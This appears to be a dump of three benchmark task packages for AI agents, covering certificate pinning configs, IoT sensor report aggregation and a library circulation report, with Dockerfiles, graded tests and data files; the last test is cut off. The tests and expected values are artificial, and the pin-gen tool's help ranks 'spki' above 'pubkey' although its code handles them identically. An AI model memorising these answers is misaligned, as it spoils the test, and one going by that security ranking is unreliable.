draft_dp_f1b896ae,hard,draft_dp_f1b896ae,security,The security team dropped SSL certs in certs/ and installed a pin-gen tool. Need certificate pinning configs for our Android/iOS apps - use the most secure algorithm the tool supports. Save configs to pinning_configs/ with separate files for each platform.,security,security|cli|python,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install cryptography

RUN mkdir -p /app/certs /app/pinning_configs

COPY api.example.com.pem /app/certs/
COPY auth.example.com.pem /app/certs/
COPY cdn.example.com.pem /app/certs/
COPY staging.example.com.pem /app/certs/

COPY pin-gen /usr/local/bin/
RUN chmod +x /usr/local/bin/pin-gen

CMD [""/bin/bash""]","import os
import json
import subprocess

def test_pinning_configs_created():
    """"""Test that pinning configurations were created for Android and iOS.""""""
    android_config = ""/app/pinning_configs/android_config.json""
    ios_config = ""/app/pinning_configs/ios_config.json""
    
    assert os.path.exists(android_config), ""Android config file not found""
    assert os.path.exists(ios_config), ""iOS config file not found""
    
    # Check that files are valid JSON
    with open(android_config, 'r') as f:
        android_data = json.load(f)
    with open(ios_config, 'r') as f:
        ios_data = json.load(f)
    
    # Verify basic structure exists
    assert isinstance(android_data, dict), ""Android config should be a dictionary""
    assert isinstance(ios_data, dict), ""iOS config should be a dictionary""

def test_most_secure_algorithm_used():
    """"""Test that SPKI with SHA-512 was used (most secure according to pin-gen docs).""""""
    android_config = ""/app/pinning_configs/android_config.json""
    ios_config = ""/app/pinning_configs/ios_config.json""
    
    # Check Android config - should contain SHA512 pins with spki-sha512 algorithm
    with open(android_config, 'r') as f:
        content = f.read()
        # Check for presence of SPKI-SHA512 algorithm and SHA512 hash prefix
        assert 'spki-sha512' in content.lower(), ""Android config should use spki-sha512 algorithm""
        assert 'SHA512:' in content, ""Android config should contain SHA512 hashed pins""
    
    # Check iOS config - should contain SPKI-SHA512-BASE64 keys
    with open(ios_config, 'r') as f:
        content = f.read()
        assert 'SPKI-SHA512-BASE64' in content, ""iOS config should use SPKI-SHA512-BASE64 format""","{""test_pinning_configs_created"": 0.4, ""test_most_secure_algorithm_used"": 0.6}","{""staging.example.com.pem"": ""-----BEGIN CERTIFICATE-----\nMIIDdjCCAl6gAwIBAgIUITBRnU6M4ZyI+dFdgYaMjUy7P6wwDQYJKoZIhvcNAQEL\nBQAwSjELMAkGA1UEBhMCVVMxEzARBgNVBAgMClNvbWUtU3RhdGUxDTALBgNVBAoM\nBFRlc3QxFzAVBgNVBAMMDnN0YWdpbmcudGVzdC5pbzAeFw0yNDAxMTUxMjAwMDBa\nFw0yNTAxMTQxMjAwMDBaMEoxCzAJBgNVBAYTAlVTMRMwEQYDVQQIDApTb21lLVN0\nYXRlMQ0wCwYDVQQKDARUZXN0MRcwFQYDVQQDDA5zdGFnaW5nLnRlc3QuaW8wggEi\nMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDixW/wBcaJ9G4JF2J4I+3QN/T5\nk2HXJPkTRX5F0dKDh9mCp38F7qHJ9G4JF2J4I+3QN/T5k2HXpAgxJPkTRX5F0dKD\nh9mCp38F7qHJ9G4JF2J4I+3QN/T5k2HXmLbQN7kcsIJPkTRX5F0dKDh9mCp38F7q\nHJ9G4JF2J4I+3QN/T5k2HXRqPIa+Q1aV9EvQj0OXkPQq/LdXH2eLNKnsDRsF7qHJ\n9G4JF2J4I+3QN/T5k2HXBBJNjBo0s5rAmNKS1eQdqCqnsDRsF7qHJ9G4JF2J4I+3\nQN/T5k2Hqnb8XndCvGTYBBcZ9I6wQVojRKS1eQjWKBjQGq+gKwpwpLzHW3fP8KJ8\nNk5MRnJB7ocM3Y0EFh3D5xfGZ6dqHJ9G4JF2J4I+3QN/T5k2HXJPkTRX5F0dKDh9\nmCAgMBAAGjUzBRMB0GA1UdDgQWBBQHJ9G4JF2J4I+3QN/T5k2HXJPkTRX5F0dKDh\nMB8GA1UdIwQYMBaAFAcn0bgkXYngj7dA39PmTYdck+RNFfkXR0oOMA8GA1UdEwEB\n/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAKKYj9HxJPkTRX5F0p38F7qHJ9G4\nJF2J4I+3QN/T5k2HFDixnPb8XndCvGTYBBcZ9I6wQVojRKYj9HxJPkTRX5F0p38F\n7qHJ9G4JF2J4I+3QN/T5k2H0lJ+aN6t2YekJrBtR5v72ylBqCqEp38F7qHJ9G4JF\n2J4I+3QN/T5k2HXJ0vMlYaX5uP7NBQqPIa+Q1aV9EvQj0OXkPQq/LdXH2eLNKnsD\nRsF7qHJ9G4JF2J4I+3QN/T5k2HXBBJNjBo0s5rAmNKS1eQdqCqnsDRsF7qHJ9G4J\nF2J4I+3QN/T5k2Hqnb8XndCvGTYBBcZ9I6wQVojRKS1eQjWKBjQGq+ggxJPkTRX5\nF0==\n-----END CERTIFICATE-----"", ""api.example.com.pem"": ""-----BEGIN CERTIFICATE-----\nMIIDazCCAlOgAwIBAgIUF8Y5N3r1dQ8bXZjdYV7MA6kPqGwwDQYJKoZIhvcNAQEL\nBQAwRTELMAkGA1UEBhMCVVMxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM\nGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDAxMTUxMjAwMDBaFw0yNTAx\nMTQxMjAwMDBaMEUxCzAJBgNVBAYTAlVTMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw\nHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB\nAQUAA4IBDwAwggEKAoIBAQC7VJr0Gf3XwEHrXFHPxR5bHaDHrJmFfRuVVqWLHLBM\n2Cb3YLnOZzI+nfZG2m6KYj9HxJPkTRX5F0dKDh9mC7EW2Cb3YLnOZzI+nfZG2m6\nKYj9HxJPkTRX5F0dKDh9mC2HJ0/sF+RFVV+MoVvLglsKJ5eURmQxXfh8dexX4f+M\nXmJB7ocM3Y0EFh3D5xfGZ6dM3Y0EFh3Dn5MX7uEvGJ+OpDFExI1yiRnJB7ocM3Y0\nqHJ9G4JF2J4I+3QN/T5k2Hc0dR8d0dR8dM3Y0EFh3D50p38F7dMOXI1yiRnJB7oc\nkJOJVKYj9HxJPkTRX5F0p38F7qHJ9G4JF2J4I+3QN/T5k2HAgMBAAGjUzBRMB0G\nA1UdDgQWBBQfcCWXFxJPkTRX5FG4JF2J4I+3QN/T5k2HTAOBgNVHQ8BAf8EBAMC\nAqQwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAXYbHKs3W+Hh2\nrHOmROJSp38F7qHJ9G4JF2J4I+3QN/T5k2HFDixnPb8XndCvGTYBBcZ9I6wQVojR\nKYj9HxJPkTRX5F0p38F7qHJ9G4JF2J4I+3QN/T5k2H0lJ+aN6t2YekJrBtR5v72y\nlBqCqEp38F7qHJ9G4JF2J4I+3QN/T5k2HXJ0vMlYaX5uP7NBQqPIa+Q1aV9EvQj0\nOXkPQq/LdXH2eLNKnsDRsF7qHJ9G4JF2J4I+3QN/T5k2HXBBJNjBo0s5rAmNKS1e\nQdqCqnsDRsF7qHJ9G4JF2J4I+3QN/T5k2Hqnb8XndCvGTYBBcZ9I6wQVojRKS1eQ\njWKBjQGq+g==\n-----END CERTIFICATE-----"", ""cdn.example.com.pem"": ""-----BEGIN CERTIFICATE-----\nMIIDcjCCAlogAwIBAgIUHR9OmT5L3YxH9cZZfYZLhTx6O5swDQYJKoZIhvcNAQEL\nBQAwRzELMAkGA1UEBhMCVVMxEzARBgNVBAgMClNvbWUtU3RhdGUxDTALBgNVBAoM\nBENDRE4xFDASBgNVBAMMC2Nkbi5jZG4uY29tMB4XDTI0MDExNTEyMDAwMFoXDTI1\nMDExNDEyMDAwMFowRzELMAkGA1UEBhMCVVMxEzARBgNVBAgMClNvbWUtU3RhdGUx\nDTALBgNVBAoMBENDRE4xFDASBgNVBAMMC2Nkbi5jZG4uY29tMIIBIjANBgkqhkiG\n9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3QNT8QLCnCkvnJB7ocM3Y0EFh3D5xfGZ6dqH\nAwpwpLzHW3fP8KJ8Nk5MRnJB7ocM3Y0EFh3D5xfGZ6dqHnOZzI+nfZG2m6KYj9Hx\nJPkTRX5F0dKDh9mCp38F7qHJ9G4JF2J4I+3QN/T5k2HXJPkTRX5F0dKDh9mCxmgF\nkTRX5F0dKDh9mCp38F7qHJ9G4JF2J4I+3QN/T5k2HXpwpLzHW3fP8KJ8Nk5MRnJB\nsF+RFVV+MoVvLglsKJ5eURmQxXfhM3Y0EFh3D5xfGZ6dqHJ9G4JF2J4I+3QN/T5k\n2HzO6t2YekJrBtR5v72ylBqCqEp38F7qHJ9G4JF2J4I+3QN/T5k2HXJPkTRX5F0d\nJ9G4JF2J4I+3QN/T5k2HXpAgMBAAGjUzBRMB0GA1UdDgQWBBT7qHJ9G4JF2J4I+3\nQN/T5k2HXJPkTRX5F0dMB8GA1UdIwQYMBaAFPuocn0bgkXYngj7dA39PmTYdck+R\nNFfkXR0wDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAp38F7qHJ\n9G4JF2J4I+3QN/T5k2HXJmQxXfhM3Y0EFh3D5xfGZ6dqHJ9G4JF2J4I+3QN/T5k2\nJNjBo0s5rAmNKS1eQdqCqnsDRsF7qHJ9G4JF2J4I+3QN/T5k2Hqnb8XndCvGTYBB\ncZ9I6wQVojRKS1eQjWKBjQGq+gF8dexX4f+MXmJB7ocM3Y0EFh3D5xfGZ6dM3Y0E\nkJrBtR5v72ylBqCqEp38F7qHJ9G4JF2J4I+3QN/T5k2HXJ0vMlYaX5uP7NBQqPIa\nBcZ9I6wQVojRKYj9HxJPkTRX5F0p38F7qHJ9G4JF2J4I+3QN/T5k2H0lJ+aN6t2Y\nfGZ6dvA==\n-----END CERTIFICATE-----"", ""auth.example.com.pem"": ""-----BEGIN CERTIFICATE-----\nMIIDcTCCAlmgAwIBAgIUGAhPmR4K2XwG9bYZeXZKgSw5N4owDQYJKoZIhvcNAQEL\nBQAwRzELMAkGA1UEBhMCVVMxEzARBgNVBAgMClNvbWUtU3RhdGUxDTALBgNVBAoM\nBEFjbWUxFDASBgNVBAMMC2F1dGguYWNtZS5pbzAeFw0yNDAxMTUxMjAwMDBaFw0y\nNTAxMTQxMjAwMDBaMEcxCzAJBgNVBAYTAlVTMRMwEQYDVQQIDApTb21lLVN0YXRl\nMQ0wCwYDVQQKDARBY21lMRQwEgYDVQQDDAthdXRoLmFjbWUuaW8wggEiMA0GCSqG\nSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDQ5tB8XwIKrM8KYj9HxJPkTRX5F0dKDh9m\nxF+RFhVKKJ9G4JF2J4I+3QN/T5k2HXndCvGTYBBcZ9I6wQVojRKS1eQjWKBjQGq+\np38F7qHJ9G4JF2J4I+3QN/T5k2HgRKwpwpLzHW3fP8KJ8Nk5MRnJB7ocM3Y0EFh3\njOKShI/HFDX/gxJPkTRX5F0dKDh9mp38F7qHJ9G4JF2J4I+3QN/T5k2HsYeNRLhN\nM3Y0EFh3D5xfGZ6dqHJ9G4JF2J4I+3QN/T5k2HsRnHQN9eZ9vXJPkTRX5F0dKDh9\nD6I3p38F7qHJ9G4JF2J4I+3QN/T5k2HT8QJLCnCkvMdbXJPkTRX5F0dKDh9XoA2X\nOQJyBKKYAgMBAAGjUzBRMB0GA1UdDgQWBBRnJB7ocM3Y0EFh3D5xfGZ6dvQj0OXk\nMB8GA1UdIwQYMBaAFGckHuhwzdjQQWHcPnF8Znp29CPQ5eQwDwYDVR0TAQH/BAUw\nAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAHJ0/sF+RFVV+MoVvLglsKJ5eURmQxXfh\nNKnsDRsF7qHJ9G4JF2J4I+3QN/T5k2HXH2eLNKnsDRsF7qHJ9G4JF2J4I+3QN/T5\nF8dexX4f+MXmJB7ocM3Y0EFh3D5xfGZ6dM3Y0EFh3Dn5MX7uEvGJ+OpDFExI1yiR\nZzI+nfZG2m6KYj9HxJPkTRX5F0dKDh9mC2HJ0/sF+RFVV+MoVvLglsKJ5eURmQxX\np38F7qHJ9G4JF2J4I+3QN/T5k2HFDixnPb8XndCvGTYBBcZ9I6wQVojRKYj9HxJP\nVz1234JF2J4I+3QN/T5k2H0lJ+aN6t2YekJrBtR5v72ylBqCqEp38F7qHJ9G4JFA\n7qHJ9G==\n-----END CERTIFICATE-----"", ""pin-gen"": ""#!/usr/bin/env python3\n\""\""\""\npin-gen - Certificate Pinning Configuration Generator\n\nThis tool generates certificate pinning configurations for mobile applications.\nIt supports multiple pinning algorithms and hash functions.\n\nUsage: pin-gen [options] <certificate_file>\n\nOptions:\n  -a, --algorithm <algo>   Pinning algorithm to use (default: cert)\n                          Available algorithms:\n                          - cert: Pin the entire certificate (less secure)\n                          - pubkey: Pin the public key only (more secure)\n                          - spki: Pin the Subject Public Key Info (most secure)\n                          \n  -h, --hash <func>       Hash function to use (default: sha256)\n                          Available: sha256, sha384, sha512\n                          \n  -f, --format <fmt>      Output format (default: android)\n                          Available: android, ios\n                          \n  -o, --output <file>     Output file (default: stdout)\n\nSecurity Recommendations:\n  For maximum security against MITM attacks, use SPKI (Subject Public Key Info)\n  pinning with SHA-512 hashing. SPKI pinning is resilient to certificate\n  renewal while maintaining strong security guarantees.\n  \n  Algorithm Security Ranking (most to least secure):\n  1. spki with sha512 - Pins public key infrastructure, survives cert renewal\n  2. spki with sha384 - Good balance of security and compatibility  \n  3. pubkey with sha512 - Pins raw public key\n  4. pubkey with sha256 - Widely compatible but less secure\n  5. cert with any hash - Pins entire cert, breaks on renewal\n\nExamples:\n  # Most secure configuration\n  pin-gen -a spki -h sha512 -f android cert.pem\n  \n  # Generate iOS configuration\n  pin-gen -a spki -h sha512 -f ios -o ios_config.json cert.pem\n\""\""\""\n\nimport argparse\nimport hashlib\nimport base64\nimport json\nimport sys\nfrom pathlib import Path\nfrom cryptography import x509\nfrom cryptography.hazmat.primitives import hashes, serialization\nfrom cryptography.hazmat.backends import default_backend\n\ndef get_certificate_der(cert_path):\n    \""\""\""Load certificate and return DER encoding.\""\""\""\n    with open(cert_path, 'rb') as f:\n        cert_data = f.read()\n    \n    try:\n        # Try PEM first\n        cert = x509.load_pem_x509_certificate(cert_data, default_backend())\n    except:\n        # Try DER\n        cert = x509.load_der_x509_certificate(cert_data, default_backend())\n    \n    return cert\n\ndef generate_pin(cert, algorithm, hash_func):\n    \""\""\""Generate pin based on algorithm and hash function.\""\""\""\n    if algorithm == 'cert':\n        # Pin entire certificate\n        data = cert.public_bytes(encoding=serialization.Encoding.DER)\n    elif algorithm == 'pubkey':\n        # Pin public key only\n        pubkey = cert.public_key()\n        data = pubkey.public_bytes(\n            encoding=serialization.Encoding.DER,\n            format=serialization.PublicFormat.SubjectPublicKeyInfo\n        )\n    elif algorithm == 'spki':\n        # Pin Subject Public Key Info (most secure)\n        pubkey = cert.public_key()\n        data = pubkey.public_bytes(\n            encoding=serialization.Encoding.DER,\n            format=serialization.PublicFormat.SubjectPublicKeyInfo\n        )\n    else:\n        raise ValueError(f\""Unknown algorithm: {algorithm}\"")\n    \n    # Hash the data\n    if hash_func == 'sha256':\n        hasher = hashlib.sha256()\n    elif hash_func == 'sha384':\n        hasher = hashlib.sha384()\n    elif hash_func == 'sha512':\n        hasher = hashlib.sha512()\n    else:\n        raise ValueError(f\""Unknown hash function: {hash_func}\"")\n    \n    hasher.update(data)\n    return base64.b64encode(hasher.digest()).decode('ascii')\n\ndef format_android(pins, algorithm, hash_func):\n    \""\""\""Format pins for Android network-security-config.xml.\""\""\""\n    config = {\n        'pin-set': {\n            'expiration': '2025-01-01',\n            'pins': []\n        }\n    }\n    \n    for domain, pin in pins.items():\n        config['pin-set']['pins'].append({\n            'domain': domain,\n            'algorithm': f\""{algorithm}-{hash_func}\"",\n            'pin': f\""{hash_func.upper()}:{pin}\""\n        })\n    \n    return json.dumps(config, indent=2)\n\ndef format_ios(pins, algorithm, hash_func):\n    \""\""\""Format pins for iOS Info.plist.\""\""\""\n    config = {\n        'NSAppTransportSecurity': {\n            'NSPinnedDomains': {}\n        }\n    }\n    \n    for domain, pin in pins.items():\n        config['NSAppTransportSecurity']['NSPinnedDomains'][domain] = {\n            'NSIncludesSubdomains': True,\n            'NSPinnedCAIdentities': [{\n                'SPKI-SHA512-BASE64': pin if algorithm == 'spki' and hash_func == 'sha512' else None,\n                'SPKI-SHA384-BASE64': pin if algorithm == 'spki' and hash_func == 'sha384' else None,\n                'SPKI-SHA256-BASE64': pin if algorithm == 'spki' and hash_func == 'sha256' else None,\n                'PublicKey-SHA512-BASE64': pin if algorithm == 'pubkey' and hash_func == 'sha512' else None,\n                'PublicKey-SHA256-BASE64': pin if algorithm == 'pubkey' and hash_func == 'sha256' else None,\n            }]\n        }\n        # Remove None values\n        config['NSAppTransportSecurity']['NSPinnedDomains'][domain]['NSPinnedCAIdentities'][0] = {\n            k: v for k, v in config['NSAppTransportSecurity']['NSPinnedDomains'][domain]['NSPinnedCAIdentities'][0].items() \n            if v is not None\n        }\n    \n    return json.dumps(config, indent=2)\n\ndef main():\n    parser = argparse.ArgumentParser(description='Certificate Pinning Configuration Generator')\n    parser.add_argument('certificate', help='Certificate file to process')\n    parser.add_argument('-a', '--algorithm', default='cert', choices=['cert', 'pubkey', 'spki'],\n                        help='Pinning algorithm (default: cert)')\n    parser.add_argument('-H', '--hash', default='sha256', choices=['sha256', 'sha384', 'sha512'],\n                        help='Hash function (default: sha256)')\n    parser.add_argument('-f', '--format', default='android', choices=['android', 'ios'],\n                        help='Output format (default: android)')\n    parser.add_argument('-o', '--output', help='Output file (default: stdout)')\n    \n    args = parser.parse_args()\n    \n    try:\n        cert = get_certificate_der(args.certificate)\n        \n        # Extract domain from certificate CN\n        cn = None\n        for attribute in cert.subject:\n            if attribute.oid._name == 'commonName':\n                cn = attribute.value\n                break\n        \n        if not cn:\n            cn = Path(args.certificate).stem\n        \n        # Generate pin\n        pin = generate_pin(cert, args.algorithm, args.hash)\n        \n        # Format output\n        pins = {cn: pin}\n        if args.format == 'android':\n            output = format_android(pins, args.algorithm, args.hash)\n        else:\n            output = format_ios(pins, args.algorithm, args.hash)\n        \n        # Write output\n        if args.output:\n            with open(args.output, 'w') as f:\n                f.write(output)\n        else:\n            print(output)\n            \n    except Exception as e:\n        print(f\""Error: {e}\"", file=sys.stderr)\n        sys.exit(1)\n\nif __name__ == '__main__':\n    main()""}",2025-07-23T06:46:03.828467+00:00,2025-07-23T11:14:17.181243+00:00
draft_dp_8be9a008,hard,draft_dp_8be9a008,data-processing,"Need to aggregate IoT sensor data from the SQLite DB and generate a hierarchical JSON report. Include hourly/daily stats, anomaly detection based on sensor specs, and group devices by zone. Output must match schema.json.",data-processing,python|data-processing|cli,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install required Python packages
RUN pip install pandas jsonschema

# Copy data files
COPY devices.csv /app/
COPY sensors.csv /app/
COPY schema.json /app/
COPY create_db.py /app/

# Create the database
RUN python create_db.py && rm create_db.py

# Set up the working directory
CMD [""/bin/bash""]","import os
import json
import jsonschema
import subprocess

def test_json_report_generated_and_valid():
    """"""Test that the JSON report exists and validates against schema""""""
    # Check if report.json exists
    assert os.path.exists('/app/report.json'), ""report.json file not found""
    
    # Load the report and schema
    with open('/app/report.json', 'r') as f:
        report = json.load(f)
    
    with open('/app/schema.json', 'r') as f:
        schema = json.load(f)
    
    # Validate against schema
    try:
        jsonschema.validate(report, schema)
    except jsonschema.ValidationError as e:
        assert False, f""JSON validation failed: {e.message}""
    
    # Check basic structure exists
    assert 'zones' in report, ""Missing 'zones' in report""
    assert 'summary' in report, ""Missing 'summary' in report""
    assert 'anomalies' in report, ""Missing 'anomalies' in report""

def test_data_aggregation_correctness():
    """"""Test that data is properly aggregated with statistics""""""
    with open('/app/report.json', 'r') as f:
        report = json.load(f)
    
    # Check that we have zones with devices
    assert len(report['zones']) > 0, ""No zones found in report""
    
    # Verify at least one device has sensor data
    device_found = False
    for zone in report['zones']:
        if 'devices' in zone and len(zone['devices']) > 0:
            for device in zone['devices']:
                if 'sensors' in device and len(device['sensors']) > 0:
                    device_found = True
                    # Check sensor has required stats
                    sensor = device['sensors'][0]
                    assert 'hourly_avg' in sensor, ""Missing hourly averages""
                    assert 'daily_peak' in sensor, ""Missing daily peaks""
                    assert 'statistics' in sensor, ""Missing statistics""
                    break
    
    assert device_found, ""No devices with sensor data found""","{""test_json_report_generated_and_valid"": 0.4, ""test_data_aggregation_correctness"": 0.6}","{""devices.csv"": ""device_id,name,zone,location,status\ndev001,Temperature Sensor A1,warehouse,Section A,active\ndev002,Humidity Monitor B1,warehouse,Section B,active\ndev003,Pressure Gauge C1,production,Line 1,active\ndev004,Motion Detector D1,security,Entrance,active\ndev005,Temperature Sensor A2,warehouse,Section A,active\ndev006,Humidity Monitor B2,warehouse,Section B,inactive\ndev007,Temperature Sensor E1,office,Floor 1,active\ndev008,Pressure Gauge C2,production,Line 2,active\ndev009,Motion Detector D2,security,Exit,active\ndev010,Temperature Sensor E2,office,Floor 2,active"", ""schema.json"": ""{\n    \""$schema\"": \""http://json-schema.org/draft-07/schema#\"",\n    \""type\"": \""object\"",\n    \""required\"": [\""zones\"", \""summary\"", \""anomalies\"", \""generated_at\""],\n    \""properties\"": {\n        \""zones\"": {\n            \""type\"": \""array\"",\n            \""items\"": {\n                \""type\"": \""object\"",\n                \""required\"": [\""zone_name\"", \""devices\""],\n                \""properties\"": {\n                    \""zone_name\"": {\""type\"": \""string\""},\n                    \""devices\"": {\n                        \""type\"": \""array\"",\n                        \""items\"": {\n                            \""type\"": \""object\"",\n                            \""required\"": [\""device_id\"", \""name\"", \""location\"", \""sensors\""],\n                            \""properties\"": {\n                                \""device_id\"": {\""type\"": \""string\""},\n                                \""name\"": {\""type\"": \""string\""},\n                                \""location\"": {\""type\"": \""string\""},\n                                \""sensors\"": {\n                                    \""type\"": \""array\"",\n                                    \""items\"": {\n                                        \""type\"": \""object\"",\n                                        \""required\"": [\""sensor_type\"", \""statistics\"", \""hourly_avg\"", \""daily_peak\""],\n                                        \""properties\"": {\n                                            \""sensor_type\"": {\""type\"": \""string\""},\n                                            \""statistics\"": {\n                                                \""type\"": \""object\"",\n                                                \""required\"": [\""mean\"", \""median\"", \""std_dev\"", \""count\""],\n                                                \""properties\"": {\n                                                    \""mean\"": {\""type\"": \""number\""},\n                                                    \""median\"": {\""type\"": \""number\""},\n                                                    \""std_dev\"": {\""type\"": \""number\""},\n                                                    \""count\"": {\""type\"": \""integer\""}\n                                                }\n                                            },\n                                            \""hourly_avg\"": {\n                                                \""type\"": \""array\"",\n                                                \""items\"": {\n                                                    \""type\"": \""object\"",\n                                                    \""required\"": [\""hour\"", \""value\""],\n                                                    \""properties\"": {\n                                                        \""hour\"": {\""type\"": \""string\""},\n                                                        \""value\"": {\""type\"": \""number\""}\n                                                    }\n                                                }\n                                            },\n                                            \""daily_peak\"": {\n                                                \""type\"": \""object\"",\n                                                \""required\"": [\""timestamp\"", \""value\""],\n                                                \""properties\"": {\n                                                    \""timestamp\"": {\""type\"": \""string\""},\n                                                    \""value\"": {\""type\"": \""number\""}\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        },\n        \""summary\"": {\n            \""type\"": \""object\"",\n            \""required\"": [\""total_devices\"", \""active_devices\"", \""total_readings\"", \""period\""],\n            \""properties\"": {\n                \""total_devices\"": {\""type\"": \""integer\""},\n                \""active_devices\"": {\""type\"": \""integer\""},\n                \""total_readings\"": {\""type\"": \""integer\""},\n                \""period\"": {\n                    \""type\"": \""object\"",\n                    \""required\"": [\""start\"", \""end\""],\n                    \""properties\"": {\n                        \""start\"": {\""type\"": \""string\""},\n                        \""end\"": {\""type\"": \""string\""}\n                    }\n                }\n            }\n        },\n        \""anomalies\"": {\n            \""type\"": \""array\"",\n            \""items\"": {\n                \""type\"": \""object\"",\n                \""required\"": [\""device_id\"", \""sensor_type\"", \""timestamp\"", \""value\"", \""reason\""],\n                \""properties\"": {\n                    \""device_id\"": {\""type\"": \""string\""},\n                    \""sensor_type\"": {\""type\"": \""string\""},\n                    \""timestamp\"": {\""type\"": \""string\""},\n                    \""value\"": {\""type\"": \""number\""},\n                    \""reason\"": {\""type\"": \""string\""}\n                }\n            }\n        },\n        \""generated_at\"": {\""type\"": \""string\""}\n    }\n}"", ""sensors.csv"": ""sensor_type,unit,min_valid,max_valid,anomaly_threshold\ntemperature,celsius,-10,50,2.5\nhumidity,percent,0,100,5.0\npressure,kpa,80,120,3.0\nmotion,boolean,0,1,0"", ""create_db.py"": ""import sqlite3\nimport random\nfrom datetime import datetime, timedelta\n\n# Create database and table\nconn = sqlite3.connect('sensor_data.db')\nc = conn.cursor()\n\nc.execute('''CREATE TABLE IF NOT EXISTS readings\n             (timestamp TEXT, device_id TEXT, sensor_type TEXT, value REAL)''')\n\n# Device to sensor type mapping\ndevice_sensors = {\n    'dev001': 'temperature',\n    'dev002': 'humidity', \n    'dev003': 'pressure',\n    'dev004': 'motion',\n    'dev005': 'temperature',\n    'dev006': 'humidity',\n    'dev007': 'temperature',\n    'dev008': 'pressure',\n    'dev009': 'motion',\n    'dev010': 'temperature'\n}\n\n# Generate sensor data for last 7 days\nend_time = datetime.now()\nstart_time = end_time - timedelta(days=7)\n\n# Normal ranges for each sensor type\nranges = {\n    'temperature': (18, 28),\n    'humidity': (30, 70),\n    'pressure': (95, 105),\n    'motion': (0, 1)\n}\n\n# Generate readings\ncurrent = start_time\nwhile current <= end_time:\n    for device_id, sensor_type in device_sensors.items():\n        # Skip inactive device sometimes\n        if device_id == 'dev006' and random.random() > 0.3:\n            continue\n            \n        # Generate value\n        if sensor_type == 'motion':\n            value = random.choice([0, 1])\n        else:\n            min_val, max_val = ranges[sensor_type]\n            value = random.uniform(min_val, max_val)\n            \n            # Add some anomalies\n            if random.random() < 0.02:  # 2% chance of anomaly\n                if random.random() < 0.5:\n                    value = value * 1.5  # High anomaly\n                else:\n                    value = value * 0.5  # Low anomaly\n        \n        c.execute(\""INSERT INTO readings VALUES (?, ?, ?, ?)\"",\n                 (current.isoformat(), device_id, sensor_type, value))\n    \n    # Move to next hour\n    current += timedelta(hours=1)\n\nconn.commit()\nconn.close()\nprint(\""Database created successfully with sensor readings\"")""}",2025-07-23T08:50:51.674298+00:00,2025-07-23T08:50:51.707426+00:00
draft_dp_2e599c56,medium,draft_dp_2e599c56,data-processing,"Process the library CSV files and generate a JSON report with circulation stats, book availability, and overdue fines. Use the schema.json for output format.",data-processing,python|data-processing|file-operations,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy all data files
COPY books.csv /app/
COPY authors.csv /app/
COPY patrons.csv /app/
COPY loans.csv /app/
COPY schema.json /app/
COPY fine_rules.json /app/

# Install required packages
RUN pip install pandas isbnlib jsonschema

CMD [""/bin/bash""]","import os
import json
import subprocess
from datetime import datetime, date

def test_report_json_validates_against_schema():
    """"""Test that the generated report.json validates against the schema""""""
    # Check if report.json exists
    assert os.path.exists('/app/report.json'), ""report.json file not found""
    
    # Validate against schema using jsonschema
    result = subprocess.run(
        ['python', '-c', '''
import json
import jsonschema

with open(""/app/report.json"") as f:
    report = json.load(f)
with open(""/app/schema.json"") as f:
    schema = json.load(f)
    
jsonschema.validate(report, schema)
print(""Valid"")
'''],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""JSON validation failed: {result.stderr}""
    assert ""Valid"" in result.stdout

def test_overdue_fine_calculations():
    """"""Test that overdue fines are calculated correctly based on patron type""""""
    with open('/app/report.json') as f:
        report = json.load(f)
    
    # Today's date for testing (2025-01-23 based on env)
    today = date(2025, 1, 23)
    
    # Check overdue details exist
    assert 'overdue_details' in report
    assert len(report['overdue_details']) > 0, ""No overdue loans found""
    
    # Verify at least one fine calculation
    # L006: P005 (student) checked out 2024-12-20, due 2025-01-03
    # Days overdue: 20 days, fine should be 0.50 * 20 = 10.00 (capped at max)
    
    # L010: P008 (student) checked out 2024-12-15, due 2024-12-29  
    # Days overdue: 25 days, fine should be 0.50 * 25 = 12.50 but capped at 10.00
    
    overdue_loans = {item['loan_id']: item for item in report['overdue_details']}
    
    # Check that overdue loans exist
    assert len(overdue_loans) >= 2, ""Expected at least 2 overdue loans""
    
    # Verify fines are calculated and within expected ranges
    for loan in report['overdue_details']:
        assert loan['fine_amount'] >= 0, ""Fine amount should not be negative""
        assert loan['fine_amount'] <= 10.00, ""Fine amount should not exceed maximum""
        assert loan['days_overdue'] > 0, ""Days overdue should be positive""

def test_book_availability_tracking():
    """"""Test that book availability is correctly calculated""""""
    with open('/app/report.json') as f:
        report = json.load(f)
    
    assert 'book_availability' in report
    assert len(report['book_availability']) > 0
    
    # Find specific books to verify calculations
    book_avail = {book['isbn']: book for book in report['book_availability']}
    
    # Check The Brothers Karamazov (9780140449334)
    # Has 3 copies, loans L001 (returned) and L016 (active)
    # Should have 2 available copies
    assert '9780140449334' in book_avail
    karamazov = book_avail['9780140449334']
    assert karamazov['available_copies'] == 2, f""Expected 2 available copies for Karamazov, got {karamazov['available_copies']}""
    assert karamazov['status'] == 'available'
    
    # Check reference books
    # Outliers (9780316017930) is reference only
    assert '9780316017930' in book_avail
    outliers = book_avail['9780316017930']
    assert outliers['status'] == 'reference_only'
    
    # Check that all books have valid status
    valid_statuses = {'available', 'checked_out', 'reference_only'}
    for book in report['book_availability']:
